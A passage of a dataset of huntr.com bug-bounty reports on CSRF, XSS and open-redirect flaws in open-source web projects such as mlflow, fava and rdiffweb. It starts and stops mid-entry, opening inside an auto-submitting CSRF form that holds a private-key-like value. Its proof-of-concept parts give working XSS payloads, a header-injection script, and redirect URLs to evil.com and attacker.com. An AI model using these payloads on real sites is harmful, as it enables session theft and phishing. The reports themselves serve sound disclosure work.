value=\"ssh&#45;rsa&#13;&#10;MIICXAIBAAKBgQCpPefILQKzndiaxLp6M9&#43;AlfZv&#47;UahWXRrZgrGJb8kT8yeCa9U&#13;&#10;zqtsOlWi58Akp1U3TxMdizqLKA9ivrAFXNc&#47;U&#47;HkqeB73GIprPvYkiL&#43;&#43;UxpJQKL&#13;&#10;bY2ybZK1&#43;I5mWiaGhNec3KSvaTRKXQZpCYnKNM8smlLPc85a3MZs0&#47;iIKQIDAQAB&#13;&#10;AoGAcf3eVjfq7&#43;xLbsM&#47;DvxNeCCJ4phnsFm&#43;TnBmpVvbSKvvGCtRyv&#43;A&#43;t63u4f5&#13;&#10;JTcH8L70ExwqDHypEEt758DGwSa&#43;p7yfxYYNLcmTfjI&#43;Hiqc05WpouwDcCeFvWwH&#13;&#10;Hrcg&#47;&#43;bbcY17G9PPn54Gcl5LUd0bNFd8hBwzdoKf0OdkX7kCQQD05SMnQNZxdgTG&#13;&#10;4BHK1J&#43;Uh2HNDruk6TilPyejPGlGKU72Y&#47;Awt2GQv0ejHIYJznkDgQ2ic3q3yvzX&#13;&#10;SKZsWvM7AkEAsOqMQIwf0nw3I7zgFsTCsw6Bu46Sot&#47;Qm0bZhNaDfyRGt5LodW5t&#13;&#10;aZkBZPZyMe8GNvKY1Y7KVPKRYYndJKuz6wJBAOTdS1gA2SfZ8qblettCkAxf5T&#43;c&#13;&#10;&#43;DIrHxwXhHSiHYRLUJclWLA&#43;gPikOk&#43;udXmusxtaPSLHpzUih96t75IuAUcCQHy8&#13;&#10;MjzETx95ourYnWqQOfJDFScnI64gfZUtQ&#43;oL0NTQv&#43;dodett&#43;0iLr1b&#47;B467Rzdw&#13;&#10;nl9b&#43;L4h9Gy&#47;5iKXyRcCQCoyLH3foTFcEigySYkgdfdGv9LpWDPb9y0c2pbGJDcr&#13;&#10;6moUZy5AQ3r4oJmpYoJQWpzUKk5FGTBkSnHo917J9Mg&#61;\" />\n      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>\nAlso attacker can send multiple request with help of Iframes.\nFix\nI just want to suggest you to set a CSRF token for this form."}, "https://huntr.com/bounties/892946b8-0b8f-4592-876f-2cdf3d35e0d0/": {"cve": "", "cve_link": "", "cwe": "CWE-352: Cross-Site Request Forgery (CSRF)", "cwe_link": "https://cwe.mitre.org/data/definitions/352.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/spiral-project/ihatemoney", "fix_commit": "https://www.github.com/spiral-project/ihatemoney/commit/2bb6f2b6a7e56a781c5041a9cccae5a8fb0508fc", "description": "\u270d\ufe0f Description\nCSRF bug to delete project\n\ud83d\udd75\ufe0f\u200d\u2642\ufe0f Proof of Concept\n1. goto https://ihatemoney.org/ and create a new project and project-name is XXXX .\nNow bellow request is vulnerable to csrf attack which will delete the whole project\nhttps://ihatemoney.org/xxxx/delete\n\ud83d\udca5 Impact\nAttacker can delete project just by sending a link to vicitm"}, "https://huntr.com/bounties/816bdaaa-8153-4732-951e-b0d92fddf709/": {"cve": "CVE-2023-6568", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6568", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/28ff3f94994941e038f2172c6484b65dc4db6ca1", "description": "Description\nThe vulnerability allows an attacker to inject malicious code into the Content-Type header of a POST request, which is then reflected back to the user without proper sanitization or escaping.\nProof of Concept\nHere's the reflection:\nand here is a script to reproduce the POC:\nfrom requests import post\n\nurl = 'http://127.0.0.1:5000/api/2.0/mlflow/users/create'\n\nheaders = {\n    'Content-Type': '<script>alert(document.domain)</script>',\n}\n\nresp = post(url, headers=headers).text\nprint(resp)\nImpact\nThis can be exploited by an attacker to execute arbitrary JavaScript code in the context of the victim's browser, potentially compromising user sessions, stealing sensitive information, or performing other malicious actions on the user's behalf."}, "https://huntr.com/bounties/222def11-0867-45e6-80ab-3f13142ebe69/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa-webmail", "fix_commit": "https://www.github.com/modoboa/modoboa-webmail/commit/f43789def10f2f866700ebc019f40b96495a3432", "description": "Issue Description\n\u2022 Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.\n\u2022 Jeffrey discovered when creating new folder in webmail it's vulnerable to Cross-Site Scripting (Reflective).\nPOC Link:\nhttps://drive.google.com/file/d/12GElAaNOQotSfZU-huE-feDm34rniJmM/view?usp=share_link\nPayload:\n<a onmouseover=\"alert(1)\">Jeffreylink</a>\nRecommendation:\n\u2022 Mark cookies as \"Secure\" and \"HTTP-Only\" where appropriate to minimize the impact of cross-site scripting attacks. \u2022 Before using any user-supplied data, validate its format and reject any characters that are not explicitly allowed (i.e. a white-list). This list should be as restrictive as possible. \u2022 Before using any data (stored or user-supplied) to generate web page content, escape all non alpha-numeric characters (i.e. output-validation). This is particularly important when the original source of data is beyond the control of the application. Even if the source of the data isn't performing input-validation, output-validation will still prevent XSS. This can be done by converting characters to \u201c&#nn;\u201d (ignore the quotes), where \u201cnn\u201d is the hexadecimal ASCII character number.\n#References\nCross-Site Scripting OWASP http://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29\nImpact\n\u2022 The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.\n\u2022 Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message."}, "https://huntr.com/bounties/ef87be4e-493b-4ee9-9738-44c55b8acc19/": {"cve": "CVE-2023-0949", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-0949", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (4.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa", "fix_commit": "https://www.github.com/modoboa/modoboa/commit/aa74e9a4a870162eea169e0a6a2eab841f8811b7", "description": "Description\nReflected XSS happens when filtering a specific tag in the Domains page and changing the \"domfilter\" URL query parameter to the malicious string.\nProof of Concept\n1 - Login as a domain admin\n2 - Go to the Domains page\n3 - Click on one of the existing tags\n4 - Change the domfilter query parameter value to <script>alert(document.cookie);</script>\n5 - Enter and refresh page\nLink for PoC: https://drive.google.com/file/d/14vWZiE6b4-l0u57jo-T-mILSz8NiLA-1/view?usp=share_link\nImpact\nXSS can cause a variety of problems for the end-user that range in severity from an annoyance to complete account compromise. The most severe XSS attacks involve disclosure of the user's session cookie, allowing an attacker to hijack the user's session and take over the account."}, "https://huntr.com/bounties/d1e17b91-2400-46e5-ba47-4ef2b85a9cae/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (4.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/modoboa/modoboa-webmail", "fix_commit": "https://www.github.com/modoboa/modoboa-webmail/commit/599c93c0d535d8d7e50d4e7a25f34097731fb08e", "description": "Description\nReflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.\nProof of Concept\nStep1: login as normal user.\nstep2: click on webmail and click on compose.\nstep3: now enter \"<svg/onload=alert(document.domain)\"@demo.local, try this payload also \"><img src=x onerror=alert(document.domain)>\nNow the web page render the js and we can see the popup in the browser.\nPOC: https://drive.google.com/file/d/1epB5BJSRG_VkdmO7KQjAZbHeWxX9kxA_/view?usp=share_link\nImpact\nXSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise. The most severe XSS attacks involve disclosure of the user's session cookie, allowing an attacker to hijack the user's session and take over the account."}, "https://huntr.com/bounties/861a8d11-0fe9-4c2f-9112-af3a9559fa87/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Low (3.5)\nAttack vector\nPhysical\nAttack complexity\nHigh\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/nltk/nltk", "fix_commit": "https://www.github.com/nltk/nltk/commit/c8cedf10de2c235a2e07223918ec569a65a67152", "description": "Description\nA reflected XSS can be achieved by simply creating a URL such as: http://localhost:8000/<script>alert(1)</script>.html\nProof of Concept\nnltk.app.wordnet_app.app()\nThen hit http://localhost:8000/<script>alert(1)</script>.html in the browser.\nImpact\nBrowser hijacking, sensitive information loss."}, "https://huntr.com/bounties/d9ff813d-e0d2-4202-9c21-c068a78825f7/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9.6)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/rhizome-conifer/conifer", "fix_commit": "https://www.github.com/rhizome-conifer/conifer/commit/5a83e7e9fce53b5156da2f817be48f9a5dfbd07b", "description": "Description\nHi Team ,\nI found XSS vulnerability in url recorder https://conifer.rhizome.org/\"USERNAME\"/default-collection/\nProof of Concept\nImage : https://ibb.co/dBr0QQr\nhttps://conifer.rhizome.org/\"USERNAME\"/default-collection/ymwk7czqxwt4l3we/record/%3Cimg%20src=x%20onerror=%22confirm(document.domain)%22%3E\nand this is another example via another user from my account :\nImage : https://ibb.co/rdWw2Cj\nprevious image contains user cookie\nMitigation\nFilter input on arrival. Encode data on output.\nImpact\nAttacker can takeover any account by just send link to the victim."}, "https://huntr.com/bounties/8705800d-cf2f-433d-9c3e-dbef6a3f7e08/": {"cve": "CVE-2022-2589", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2589", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.9)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/beancount/fava", "fix_commit": "https://www.github.com/beancount/fava/commit/68bbb6e39319deb35ab9f18d0b6aa9fa70472539", "description": "Description\nFava v1.22 have a conversion filter function on income statement dashboard which allow user to perform XSS due to improper validation on filter conversion.\nProof of Concept\nNavigate to Fava demo instance https://fava.pythonanywhere.com/example-beancount-file/income_statement/.\nFilter on conversion type and add payload on the result.\nHover mouse cursor to bar chart (visualization) and XSS alert will pop up.\nEndpoints\nhttps://fava.pythonanywhere.com/huge-example-file/income_statement/?conversion=at_value\nhttps://fava.pythonanywhere.com/example-with-budgets/income_statement/?conversion=units\nhttps://fava.pythonanywhere.com/example-beancount-file/income_statement/?conversion=at_value\nPayload\n\"><img src=a onerror=alert(document.domain)>\nScreenshot POC\nxss domain\nxss\nImpact\nThis vulnerability is capable of executing a malicious javascript code in web page"}, "https://huntr.com/bounties/2a1802d8-1c2e-4919-96a7-d4dcf7ffcf8f/": {"cve": "CVE-2022-2523", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2523", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/beancount/fava", "fix_commit": "https://www.github.com/beancount/fava/commit/dccfb6a2f4567f35ce2e9a78e24f92ebf946bc9b", "description": "Description\nThe \"query_string\" parameter of fava application is vulnerable to reflected XSS for which a attacker can modify any information that the user is able to modify.\nProof of Concept\n1.Open the url: https://fava.pythonanywhere.com/example-with-budgets/query/?filter=payee%3A%22Chichipotle%22&query_string=%3Cimg+src%3D1+onerror%3Dalert%28document.location%29%3E\n2.Now XSS will popup.\nImage\nhttps://drive.google.com/file/d/1N7XGqTg4J5rPdDzFQ4TgEtwE9v2LXDlL/view?usp=sharing\nImpact\nIf an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:\n+Perform any action within the application that the user can perform.\n+View any information that the user is able to view.\n+Modify any information that the user is able to modify.\nInitiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user. There are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message"}, "https://huntr.com/bounties/dbf77139-4384-4dc5-9994-45a5e0747429/": {"cve": "CVE-2022-2514", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-2514", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8)\nAttack vector\nNetwork\nAttack complexity\nHigh\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/beancount/fava", "fix_commit": "https://www.github.com/beancount/fava/commit/ca9e3882c7b5fbf5273ba52340b9fea6a99f3711", "description": "Description\nThe time parameter in fava is vulnerable to reflected XSS\nProof of Concept\n1.Open the web browser to access the fava webpage.\n2.Access the url: https://fava.pythonanywhere.com/example-beancount-file/income_statement/?time=%22%3E%3Cbutton+onclick%3Dalert%281%29%3EClICK+ME%3C%2Fbutton%3E Script will be reflected in on clicking the button.\n3.when the victim clicks on the button -> Alert box will pop up\nImage\nhttps://drive.google.com/file/d/1PJ_kKyn5KrHbzplApD-rfhuwSbtsCTvS/view?usp=sharing\nImpact\nIf an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:\n+Perform any action within the application that the user can perform.\n+View any information that the user is able to view.\n+Modify any information that the user is able to modify.\nInitiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user. There are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message"}, "https://huntr.com/bounties/db8d0512-621e-4ee0-850d-8e9e8522aef5/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Critical (9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in customer company description field.\nProof of Concept\nVideo PoC Link: https://drive.google.com/file/d/19l7W3MMeTdhQzroutdDBBIdIVLGhQtw1/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/9d640ef2-c52c-4106-b043-f7497d577078/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/inventree/inventree", "fix_commit": "https://www.github.com/inventree/inventree/commit/26bf51c20a1c9b3130ac5dd2e17649bece5ff84f", "description": "Description\nThe application inventree is vulnerable to Stored XSS in part parameter field.\nProof of Concept\nVideo PoC link: https://drive.google.com/file/d/19MiGIB3Q1Vzdm_MB_ttCKiEtFKR34z-2/view?usp=sharing\nImpact\nThis allows the attacker to execute malicious scripts in all the project members browser and it can lead to session hijacking, sensitive data exposure, and worse."}, "https://huntr.com/bounties/101a2a31-0b27-433a-ad3a-a216238ca4d1/": {"cve": "CVE-2022-1806", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-1806", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "Medium (6.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/rtxteam/rtx", "fix_commit": "https://www.github.com/rtxteam/rtx/commit/9bb109b0014f952f315c7b89e0f29a9ba84ee04c", "description": "Description\nhello team, i found a reflected xss in /rtxcomplete/nodeslike via callback parameter\nProof of Concept\nhttps://arax.rtx.ai/rtxcomplete/nodeslike?_=1651210002052&callback=%3CScRiPt%20%3Ealert(document.domain)%3C/ScRiPt%3E&limit=15&word=1\nImpact\nSteal User Cookie or redirect to malicious sites"}, "https://huntr.com/bounties/cfa17a28-7bce-4d3f-892a-93a0c0cc4a8c/": {"cve": "", "cve_link": "", "cwe": "CWE-79: Cross-site Scripting (XSS) - Reflected", "cwe_link": "https://cwe.mitre.org/data/definitions/79.html", "severity_score": "High (8.4)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/cujanovic/ssrf-testing", "fix_commit": "https://www.github.com/cujanovic/ssrf-testing/commit/971359ccf938c547ac6a99a0c182541150d560e2", "description": "\u270d\ufe0f Description\nCross-site Scripting (XSS) refers to client-side code injection attack wherein an attacker can execute malicious scripts into a legitimate website or web application. XSS occurs when a web application makes use of unvalidated or unencoded user input within the output it generates.\nThe user input GET parameter proto ip port url of index.php is unsanitized resulting reflected cross site scripting.\nRemediation\nApply context-dependent encoding and/or validation to user input rendered on a page\n\ud83d\udccd Location index.php#L8-L12 \ud83d\udcdd References XSS"}, "https://huntr.com/bounties/339687af-6e25-4ad8-823d-c097f607ea70/": {"cve": "CVE-2022-4720", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4720", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Medium (6.1)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/6afaae56a29536f0118b3380d296c416aa6d078d", "description": "Description\nHyperlink Injection it\u2019s when attacker injecting a malicious link when sending an email invitation. Hyperlink injection in the email can lead to phishing via email directly to users.\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/tokens\n2) Create a new access token with name \"evil.com\"\n3) You will see that an email will trigger on the registered email with the hyperlink injected successfully \n4) Click on the hyperlink and you will be redirected to a malicious website\n\n\n\n\n# Impact\n\nThis vulnerability allows an attacker to redirect a victim to malicious website "}, "https://huntr.com/bounties/77e5f425-c764-4cb0-936a-7a76bfcf19b0/": {"cve": "CVE-2022-4644", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-4644", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Medium (5.9)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/5f861670ef8f38ca8eea52a98672d0e0fabb5368", "description": "Description\nA web server commonly hosts several web applications on the same IP address, referring to each application via the virtual host. In an incoming HTTP request, web servers often dispatch the request to the target virtual host based on the value supplied in the Host header. Without proper validation of the header value, the attacker can supply invalid input to cause the web server to:\nDispatch requests to the first virtual host on the list. Perform a redirect to an attacker-controlled domain. Perform web cache poisoning. Manipulate password reset functionality. Allow access to virtual hosts that were not intended to be externally accessible.\nProof of Concept\n1. Go to https://rdiffweb-demo.ikus-soft.com and login using the credentials\n2. After logging into the website,  refresh the page and intercept the request using burpsuite. Request will look something like this - \n\nGET / HTTP/1.1\nHost: rdiffweb-demo.ikus-soft.com\nCookie: session_id=38522b2736a9c2f012c30962b9ef4cc772326a23\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\n3. Add a header X-Forwarded-Host: bing.com in the request and send the request -\n\nGET / HTTP/1.1\nHost: rdiffweb-demo.ikus-soft.com\nX-Forwarded-Host: bing.com\nCookie: session_id=38522b2736a9c2f012c30962b9ef4cc772326a23\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\nTe: trailers\nConnection: close\n\n4. Search for bing.com in the response and you will see that the paths have changed to bing.com.\n5. Right click and select show response in browser. Copy the url and paste it in your browser\n6. Now click on any tab like Repositories, status, admin area etc and you will be redirected to bing.com\n\nProof of Concept -\n\n![Screenshot1](https://drive.google.com/file/d/1TvAl_Fj4qL0ldl7uzbfQagiOFUdsnuXB/view?usp=sharing)\n![Screenshot2](https://drive.google.com/file/d/1jBke7umSQlYKp1zYVFuKd6yyl7DDdr4l/view?usp=sharing)\n![Screenshot3](https://drive.google.com/file/d/1W2KN_d7EFWYl3TH4ptUE-AGZQq6OIKOf/view?usp=sharing)\nImpact\nIf the app does not validate untrusted user input, an attacker could supply a URL that redirects an unsuspecting victim from a legitimate domain to an attacker's phishing site and can perform different actions like stealing credentials."}, "https://huntr.com/bounties/bc5689e4-221a-4200-a8ab-42c659f89f67/": {"cve": "CVE-2022-3438", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3438", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Medium (5.7)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nHigh\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/4d464b467f14b8eb9103d7f5f0774e49995527c7", "description": "Description\nHyperlink Injection it\u2019s when attacker injecting a malicious link when sending an email invitation\nProof of Concept\n1) Go to https://rdiffweb-dev.ikus-soft.com/prefs/general \n2) Set your full name as \"Your account has been hacked please visit evil.com\"\n3) Save changes\n4) Perform any activity that will lead to triggering an email on the victims registered email address (Password change / request to enable 2FA)\n5) Victim will receive an email where evil.com is in the form of  a hyperlink \n6) As soon as he will click on evil.com he will be redirected to the malicious website\n\nLet us consider a scenario where the user has left his account open in a cafe or library . Attacker gets access to the account , will change Full name to Your account has been hacked please visit evil.com , evil.com will be in the form of a hyperlink in the email received by the user. As soon as victim clicks , he is redirected to malicious website\n\nMitigation: Full name is a field that requires only alphabets (in worst case some may have numbers) , prevent all entries of special characters including a ' . '\n\nAs soon as he click\n\n\n# Impact\n\nAn attacker can redirect victim to malicious website "}, "https://huntr.com/bounties/ceb78332-ba4d-4545-a732-22c6041bbe87/": {"cve": "", "cve_link": "", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Medium (4.7)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nChanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/dade9a9e92fb50772dddf4629d565112b458bec4", "description": "Description\nThe application has an Open Redirect vulnerability because the data filtering process does not completely prevent attacks.\nProof of Concept\nStep 1: Visit https://rdiffweb-demo.ikus-soft.com/login/?redirect=//evil.com\nStep 2: Login with valid account, you will be redirect to evil.com\nImpact\nAttackers can redirect users to any website and perform phishing attacks."}, "https://huntr.com/bounties/dac1d267-69f4-4c52-ba93-7917ee234066/": {"cve": "", "cve_link": "", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "Low (2.8)\nAttack vector\nLocal\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/42455b19ff973db2728f9289cae3091c39d1f82d", "description": "Description\nikus060/rdiffweb is vulnerable to open redirect at login page.\nProof of Concept\nhttps://rdiffweb-demo.ikus-soft.com/login/?redirect=https://attacker.com\nafter login to the above url it redirect to attacker .com\nImpact\nThis vulnerability is capable of redirecting to malicious website"}, "https://huntr.com/bounties/67ca22bd-19c6-466b-955a-b1ee2da0c575/": {"cve": "CVE-2022-35953", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-35953", "cwe": "CWE-601: Open Redirect", "cwe_link": "https://cwe.mitre.org/data/definitions/601.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/1518dbba86c23028ce0c7ad290f0fd2ed1a65af7", "description": "Description:\nHello @bookwyrm-social I found a tabnabbing vulnerability. attack is possible due to taget=_blank or Tab nabbing via window.opener.\nVISIT:- https://bookwyrm.social/\nSUMMARY:\nI was browsing the site and found a tabnabbing vulnerability . As per the observation I found that attack is possible due to taget=_blank or Tab nabbing via window.opener. When you open a link in a new tab ( target=\"_blank\" ), the page that opens in a new tab can access the initial tab and change it's location using the window.opener property.\nSTEPS TO REPRODUCE:\n1- Open the website URL :- https://bookwyrm.social/\n2- Right-click and click on inspect element\n3- Locate the cursor to Element Tab then do CTRL+F or Search for taget=\"_blank\"\n4- If you get blank with a link it means website can be vulnerable like , open redirect like vulnerabilities\n5- For More Details To Check the POC\nPOC Screenshot 1:\nPOC Screenshot 2:\nMITIGATIONS:-\nIn order to mitigate this issue, developers are encouraged to use rel=\"nofollow noopener noreferrer\" as follows: <a target=\"_blank\" class=\"btn external-url\" href=#\" https://evil.com \" rel=\"nofollow noopener noreferrer\"><i class=\"fa fa-external-link\"></i> </a>\nDon't open links in new tabs using the target=\"_blank\" Add attribute rel=\"noreferrer\" which also disables referrer Set the window.opener attribute to null on the new tab before redirecting, like this: <script>var w=window.open(url, \"target=_blank\");w.opener= 